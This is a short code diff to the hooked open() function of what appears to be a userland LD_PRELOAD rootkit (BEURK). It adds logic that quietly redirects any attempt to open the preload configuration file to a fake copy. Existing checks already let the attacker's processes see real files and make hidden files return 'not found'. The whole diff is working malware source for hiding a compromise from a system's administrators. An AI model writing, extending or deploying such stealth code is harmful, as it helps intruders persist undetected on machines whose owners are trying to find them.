@@ -21,6 +21,7 @@
 #include <stdarg.h> /* va_list, va_start(), va_args(), va_end() */
 #include <fcntl.h> /* O_CREAT */
 #include <sys/stat.h> /* mode_t */
+#include <string.h> /* strstr() */
 #include <errno.h> /* errno, ENOENT */
 #include "beurk.h" /* is_attacker(), is_hidden_file() */
 #include "config.h" /* REAL_OPEN() */
@@ -42,6 +43,10 @@ int open(const char *pathname, int flag, ...) {
         if (is_attacker())
             return REAL_OPEN(pathname, flag, mode);
 
+        if (is_ld_preload_file(pathname)) {
+            return REAL_OPEN(FAKE_LD_PRELOAD, flag, mode);
+        }
+
         if (is_hidden_file(pathname)) {
             errno = ENOENT;
             return (-1);
@@ -52,6 +57,10 @@ int open(const char *pathname, int flag, ...) {
 
     if (is_attacker())
         return REAL_OPEN(pathname, flag);
+
+    if (is_ld_preload_file(pathname)) {
+        return REAL_OPEN(FAKE_LD_PRELOAD, flag);
+    }
 
     if (is_hidden_file(pathname)) {
         errno = ENOENT;
